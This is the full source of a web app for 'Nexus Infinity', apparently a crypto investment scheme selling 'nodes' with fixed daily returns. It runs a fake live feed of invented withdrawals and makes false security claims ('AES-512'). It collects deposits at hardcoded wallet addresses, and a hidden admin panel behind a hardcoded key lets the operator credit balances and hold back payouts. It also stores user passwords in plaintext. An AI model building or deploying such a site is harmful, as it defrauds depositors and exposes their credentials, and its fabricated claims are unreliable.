<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Sovereign Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #030508; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        .glass { background: rgba(255, 255, 255, 0.01); backdrop-filter: blur(60px); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 35px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 20px; border-radius: 24px; text-transform: uppercase; width: 100%; border: none; color: white; cursor: pointer; transition: 0.4s; box-shadow: 0 15px 35px rgba(255, 0, 255, 0.15); }
        .btn-master:active { transform: scale(0.95); opacity: 0.8; }
        
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; transition: 0.3s; }
        .input-hub:focus { border-color: var(--n-pink); background: rgba(255, 255, 255, 0.05); }

        /* VIRTUAL NOTIFICATIONS */
        #viral-toast { position: fixed; top: 50px; left: 50%; transform: translateX(-50%) translateY(-200%); z-index: 10001; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); width: 90%; max-width: 350px; }
        #viral-toast.active { transform: translateX(-50%) translateY(0); }

        .nav-item { color: #334155; transition: 0.4s; text-align: center; flex: 1; cursor: pointer; position: relative; }
        .nav-active { color: #fff; }
        .nav-active::after { content: ''; position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 5px; height: 5px; background: var(--n-pink); border-radius: 50%; box-shadow: 0 0 15px var(--n-pink); }
        
        .marquee-box { background: black; border-bottom: 1px solid rgba(255, 255, 255, 0.05); height: 40px; display: flex; align-items: center; position: fixed; top: 0; width: 100%; z-index: 100; font-family: 'Syncopate'; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .marquee-text { white-space: nowrap; animation: marquee 30s linear infinite; font-size: 9px; color: var(--n-blue); letter-spacing: 3px; font-weight: 700; }
        
        .hidden { display: none !important; }
        .node-card:hover { border-color: var(--n-pink); transform: translateY(-5px); }
    </style>
</head>
<body class="selection:bg-pink-500/30">

    <div class="marquee-box"><div id="broadcast-msg" class="marquee-text uppercase">NEXUS GLOBAL SETTLEMENT ENGINE ACTIVE... SECURED BY AES-512... MULTI-CHAIN PROTOCOL V4.0 LIVE...</div></div>

    <div id="viral-toast" class="glass p-5 flex items-center gap-5 border-t-2 border-pink-500 shadow-2xl">
        <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-pink-600 to-blue-600 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-globe text-white"></i></div>
        <div class="flex-1">
            <p id="toast-user" class="text-[10px] font-black uppercase text-white italic">User_99** (London)</p>
            <p id="toast-action" class="text-[9px] font-bold text-zinc-500 uppercase tracking-tighter">Withdrew $1,240.50 via USDT</p>
        </div>
        <div class="text-[8px] font-black text-green-500 uppercase">Just Now</div>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#030508] z-[9999] flex flex-col items-center justify-center">
        <div class="w-28 h-28 bg-gradient-to-tr from-pink-600 to-blue-600 rounded-[2.8rem] flex items-center justify-center text-6xl font-black italic shadow-[0_0_80px_rgba(0,212,255,0.2)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-10 text-[10px] tracking-[1em] text-white/20 uppercase">Global Sovereign</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full glass p-10 space-y-10 border-b-4 border-blue-600">
            <div id="login-ui" class="space-y-8">
                <div class="text-center"><h2 class="text-4xl font-black italic tracking-tighter uppercase italic">Nexus <span class="text-pink-500 block text-sm tracking-[8px] mt-2">Empire Core</span></h2></div>
                <input type="text" id="l-user" placeholder="Terminal ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Master Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize Session</button>
                <div class="flex justify-between items-center px-2">
                    <p onclick="toggleAuth(true)" class="text-[10px] text-blue-400 font-black uppercase cursor-pointer">New Entity</p>
                    <p class="text-[10px] text-zinc-600 font-black uppercase italic">V4.0 Global</p>
                </div>
            </div>
            <div id="signup-ui" class="space-y-8 hidden">
                <h2 class="text-3xl font-black italic tracking-tighter uppercase text-center text-blue-500">Global <span class="text-white block text-sm tracking-[5px] mt-2">Registration</span></h2>
                <input type="text" id="s-user" placeholder="Create ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Create Key" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral Protocol" class="input-hub">
                <button onclick="handleSignup()" class="btn-master">Initialize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Back to Hub</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pt-16 pb-36">
        <header class="p-6 flex justify-between items-center sticky top-10 bg-[#030508]/80 backdrop-blur-3xl z-50 border-b border-white/5">
            <div class="flex items-center gap-5">
                <div id="admin-trigger" class="w-14 h-14 bg-white/5 rounded-2xl flex items-center justify-center font-black italic text-pink-500 text-3xl border border-white/10">N</div>
                <div><p id="nav-user" class="text-lg font-black uppercase text-white italic">...</p><p class="text-[8px] text-blue-500 font-black uppercase tracking-[3px]">Verified Sovereign Entity</p></div>
            </div>
            <div class="flex gap-4">
                <button onclick="logout()" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-zinc-500"><i class="fa-solid fa-power-off"></i></button>
            </div>
        </header>

        <main id="page-home" class="p-6 space-y-8">
            <div class="glass p-10 relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-pink-500/10 rounded-full blur-3xl"></div>
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-[4px] mb-3">Portfolio Net Worth</p>
                <h2 id="balance-txt" class="text-6xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-12 grid grid-cols-2 gap-4 border-t border-white/5 pt-8">
                    <div><p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Yield Wallet</p><p id="profit-txt" class="text-2xl font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Protocol ID</p><p id="my-ref" class="text-xs font-black text-blue-400 uppercase">...</p></div>
                </div>
            </div>
            <div class="flex items-center justify-between px-2"><h3 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Deployed Nodes</h3><span class="text-[9px] text-green-500 font-black animate-pulse uppercase">Live Syncing</span></div>
            <div id="active-nodes-list" class="grid gap-5"></div>
        </main>

        <main id="page-market" class="p-6 space-y-8 hidden">
            <h3 class="text-2xl font-black italic uppercase text-blue-400">Node Market</h3>
            <div id="market-list" class="grid gap-6"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-10 hidden">
            <div class="glass p-8 space-y-8">
                <h3 class="text-xl font-black uppercase text-pink-500 italic">Financial Ingress</h3>
                <div class="grid grid-cols-3 gap-3">
                    <div onclick="setDep('TRX','TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer"><i class="fa-solid fa-gem text-blue-400 mb-2"></i><p class="text-[9px] font-black">TRX</p></div>
                    <div onclick="setDep('ETH','0xD9359EADE5F5bACA51fb7da043767Bc0685bC355')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer"><i class="fa-brands fa-ethereum text-indigo-400 mb-2"></i><p class="text-[9px] font-black">ETH</p></div>
                    <div onclick="setDep('USDT','TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer"><i class="fa-solid fa-dollar-sign text-green-400 mb-2"></i><p class="text-[9px] font-black">USDT</p></div>
                </div>
                <div id="dep-form" class="hidden space-y-6 pt-6 border-t border-white/10 animate-fade-in">
                    <div class="text-center"><p id="dep-addr" class="text-[9px] font-mono break-all bg-black p-4 rounded-2xl text-zinc-400 border border-white/5 select-all"></p><p class="text-[8px] text-pink-500 mt-2 font-black uppercase italic">Click address to copy</p></div>
                    <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash / ID" class="input-hub">
                    <div class="relative group"><input type="file" id="dep-proof" accept="image/*" class="text-[10px] w-full file:bg-white/5 file:border-0 file:rounded-full file:px-6 file:py-3 file:text-white file:font-black"></div>
                    <img id="preview-img" class="w-full h-48 object-cover rounded-3xl hidden border-2 border-white/5">
                    <button onclick="submitDep()" class="btn-master">Confirm Settlement</button>
                </div>
            </div>
            <div class="glass p-8 space-y-8">
                <h3 class="text-xl font-black uppercase text-blue-400 italic">Payout Egress</h3>
                <div class="space-y-6">
                    <p class="text-[10px] text-zinc-500 uppercase font-black px-1">Redeemable Yield: <span id="with-avail" class="text-white">$0.00</span></p>
                    <input type="text" id="w-addr" placeholder="Destination Wallet Address" class="input-hub">
                    <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-hub">
                    <button onclick="submitWith()" class="btn-master !bg-white !text-black !shadow-none">Initialize Payout</button>
                    <p class="text-[8px] text-zinc-700 text-center font-bold uppercase tracking-widest leading-relaxed">Processing Time: 12-24H Institutional Audit<br>Security Protocol Active</p>
                </div>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-10 hidden">
            <div><h3 class="text-xl font-black uppercase italic mb-8 ml-2">Protocol Ledger</h3><div id="history-list" class="grid gap-4"></div></div>
            <div class="glass p-8 space-y-6">
                <h3 class="text-xl font-black uppercase text-pink-500 italic">Global Infrastructure</h3>
                <p class="text-[11px] leading-relaxed text-zinc-500 uppercase font-bold tracking-tight">Nexus Infinity is a worldwide decentralized node computing provider. We specialize in institutional liquidity and ultra-fast asset settlements. Licensed for global operations under V4.0 Protocol.</p>
            </div>
            <div class="glass p-8"><h3 class="text-lg font-black uppercase italic text-blue-400 mb-6">FAQ</h3><div class="space-y-5 text-[10px] uppercase font-black text-zinc-600"><div class="faq-item">Q: Withdrawal speed? <span class="text-white block mt-1">A: Within 24 hours globally.</span></div><div class="faq-item">Q: Minimum Invest? <span class="text-white block mt-1">A: $15.00 entry level.</span></div><div class="faq-item">Q: Is it safe? <span class="text-white block mt-1">A: AES-512 Terminal Encryption.</span></div></div></div>
            <p class="text-center text-[9px] text-zinc-800 font-black uppercase tracking-[5px] pb-10">Nexus Infinity &copy; 2026 World</p>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-8 bg-[#030508]/90 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-house-chimney text-2xl"></i><p class="text-[8px] font-black mt-2">CORE</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-server text-2xl"></i><p class="text-[8px] font-black mt-2">MARKET</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-wallet text-2xl"></i><p class="text-[8px] font-black mt-2">VAULT</p></div>
            <div onclick="switchPage('logs')" class="nav-item"><i class="fa-solid fa-receipt text-2xl"></i><p class="text-[8px] font-black mt-2">LOGS</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#030508] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-12 border-b border-white/10 pb-8">
            <h2 class="text-3xl font-black italic text-pink-500 uppercase">Master Command</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-5xl">&times;</button>
        </div>
        <div class="space-y-10">
            <div class="glass p-8 space-y-6 border-l-4 border-blue-500">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Admin Power: Add Balance</h4>
                <input type="text" id="adm-user" placeholder="User ID" class="input-hub">
                <input type="number" id="adm-amt" placeholder="Amount to Add ($)" class="input-hub">
                <button onclick="adminAddBalance()" class="btn-master !py-4">Inject Equity</button>
            </div>
            <div class="glass p-8 space-y-4">
                <h4 class="text-[10px] font-black uppercase text-zinc-500 tracking-[5px]">Global Broadcast Sync</h4>
                <input type="text" id="adm-bc" placeholder="New Marquee Text..." class="input-hub">
                <button onclick="updateBroadcast()" class="btn-master !py-3 !bg-blue-600">Update Network</button>
            </div>
            <h3 class="text-xs font-black uppercase text-zinc-500 ml-2 tracking-widest">Active Requests Queue</h3>
            <div id="admin-requests" class="grid gap-6"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const marketNodes = Array.from({length: 22}, (_, i) => ({
            id: i+1, title: i<11 ? `Cyber-Node V${i+1}` : `Empire Sovereign X-${i-10}`, price: i<11 ? (i+1)*25 : (i-10)*800, daily: i<11 ? (i+1)*3.8 : (i-10)*140, days: 30, img: `https://picsum.photos/seed/sovereign${i+20}/400/220`
        }));

        let selMet = ''; window.setDep = (t, a) => { selMet = t; document.getElementById('dep-addr').innerText = a; document.getElementById('dep-form').classList.remove('hidden'); navigator.clipboard.writeText(a); };

        window.onload = () => {
            renderMarket();
            startViralEngine();
            onValue(ref(db, 'system/broadcast'), (s) => { if(s.val()) document.getElementById('broadcast-msg').innerText = s.val(); });
            setTimeout(() => { document.getElementById('splash').style.display = 'none'; const u = localStorage.getItem('nexus_user'); if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden'); }, 3000);
        };

        function startViralEngine() {
            const locs = ["(Dubai)", "(Tokyo)", "(London)", "(USA)", "(Germany)", "(Pakistan)", "(Brazil)", "(Sydney)"],
                  acts = ["Invested $2,500.00", "Withdrew $890.20", "Unlocked Tier-5 Node", "Redeemed $150 Yield", "Deposited $300 USDT"];
            setInterval(() => {
                document.getElementById('toast-user').innerText = `User_${Math.floor(Math.random()*9000+1000)}** ${locs[Math.floor(Math.random()*locs.length)]}`;
                document.getElementById('toast-action').innerText = acts[Math.floor(Math.random()*acts.length)];
                document.getElementById('viral-toast').classList.add('active');
                setTimeout(() => document.getElementById('viral-toast').classList.remove('active'), 4000);
            }, 9000);
        }

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass overflow-hidden node-card transition-all duration-300"><img src="${n.img}" class="w-full h-36 object-cover opacity-30 grayscale hover:grayscale-0 transition-all"><div class="p-8 flex justify-between items-center"><div><h4 class="font-black italic uppercase text-sm">${n.title}</h4><p class="text-[10px] font-bold text-green-500 mt-2">Daily Return: $${n.daily.toFixed(2)}</p></div><div class="text-right"><p class="text-xl font-black text-white">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-4 bg-white text-black px-6 py-2 rounded-2xl text-[10px] font-black uppercase italic">Activate</button></div></div></div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), s = await get(ref(db, `users/${user}`));
            if((s.val().balance || 0) < node.price) return alert("System Warning: Insufficient Sovereign Equity.");
            const now = Date.now();
            await update(ref(db, `users/${user}`), { balance: s.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: now, expires: now + (node.days * 86400000), lastClaim: now });
            alert("Infrastructure Successfully Deployed to Network!"); switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid; document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                document.getElementById('with-avail').innerText = '$' + (d.profit || 0).toFixed(2);

                const logs = d.history ? Object.values(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = logs.map(l => `
                    <div class="glass p-6 border-r-4 ${l.status === 'Approved' ? 'border-green-500' : 'border-pink-500'} flex justify-between items-center animate-fade-in">
                        <div><p class="text-[11px] font-black uppercase">${l.type} - ${l.method || 'Protocol'}</p><p class="text-[8px] text-zinc-600 mt-2 font-bold">${l.date}</p></div>
                        <div class="text-right"><p class="text-sm font-black italic">$${parseFloat(l.amount).toFixed(2)}</p><p class="text-[9px] font-black uppercase tracking-widest ${l.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${l.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-20 py-20 uppercase font-black text-[11px]">Ledger Empty</p>';

                const activeNodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = activeNodes.map(([k, n]) => {
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass p-7 border-l-4 border-blue-500 flex justify-between items-center"><div class="flex items-center gap-5"><div class="w-10 h-10 rounded-full bg-blue-500/10 flex items-center justify-center animate-pulse"><i class="fa-solid fa-microchip text-blue-500"></i></div><div><p class="text-[11px] font-black uppercase">${n.title}</p><p class="text-[9px] font-bold text-zinc-600">Yielding: $${n.daily.toFixed(2)}</p></div></div><p class="text-[9px] font-black text-blue-400 uppercase italic">Active</p></div>`;
                }).join('');
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Error: Incomplete Ingress Protocol.");
            const hKey = push(ref(db, `users/${user}/history`)).key;
            const ent = { user, amount: amt, tid, proof, method: selMet, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey };
            await set(ref(db, `users/${user}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent);
            alert("Settlement Proof Logged for Audit.");
        };

        window.submitWith = async () => {
            const u = localStorage.getItem('nexus_user'), amt = parseFloat(document.getElementById('w-amt').value), adr = document.getElementById('w-addr').value, s = await get(ref(db, `users/${u}`));
            if(!amt || !adr || amt < 10) return alert("System Notice: Min Withdrawal $10.00.");
            if((s.val().profit || 0) < amt) return alert("Error: Insufficient Yield Balance.");
            const hKey = push(ref(db, `users/${u}/history`)).key;
            const ent = { user: u, amount: amt, address: adr, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey };
            await update(ref(db, `users/${u}`), { profit: s.val().profit - amt });
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent);
            alert("Egress Initialized Successfully.");
        };

        window.manage = async (id, user, amt, hKey, action, type) => {
            if(action === 'approve') {
                if(type === 'Deposit') {
                    const s = await get(ref(db, `users/${user}`));
                    await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
                }
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                if(type === 'Withdrawal') {
                    const s = await get(ref(db, `users/${user}`));
                    await update(ref(db, `users/${user}`), { profit: (s.val().profit || 0) + parseFloat(amt) });
                }
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, 'admin/requests/' + id));
        };

        window.adminAddBalance = async () => {
            const u = document.getElementById('adm-user').value.trim(), a = parseFloat(document.getElementById('adm-amt').value);
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && a) { await update(ref(db, `users/${u}`), { balance: (s.val().balance || 0) + a }); alert(`Injected $${a} to ${u}`); }
            else alert("Target Entity Not Found.");
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-7 space-y-5 border border-white/10">
                        <div class="flex justify-between text-[10px] font-black uppercase italic"><span class="${l.type === 'Deposit' ? 'text-blue-500' : 'text-pink-500'}">${l.type}</span><span class="text-zinc-600">${l.date}</span></div>
                        <p class="text-[11px] font-black uppercase text-white">USER: ${l.user} | VALUE: <span class="text-green-500">$${l.amount}</span></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-48 object-cover rounded-3xl border border-white/5" onclick="window.open(this.src)">` : `<div class="bg-black/50 p-4 rounded-2xl break-all text-[9px] font-mono text-zinc-500">ADDR: ${l.address}</div>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve','${l.type}')" class="bg-green-500/20 text-green-500 py-4 rounded-2xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject','${l.type}')" class="bg-red-500/20 text-red-500 py-4 rounded-2xl text-[10px] font-black uppercase">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-10 uppercase font-black text-[11px]">Audit Queue Clear</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Sovereign Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','logs'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied: Invalid Credentials."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim(); if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r }); alert("Identity Authorized."); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updateBroadcast = async () => { await set(ref(db, 'system/broadcast'), document.getElementById('adm-bc').value); alert("Network Broadcast Updated."); };
    </script>
</body>
</html>
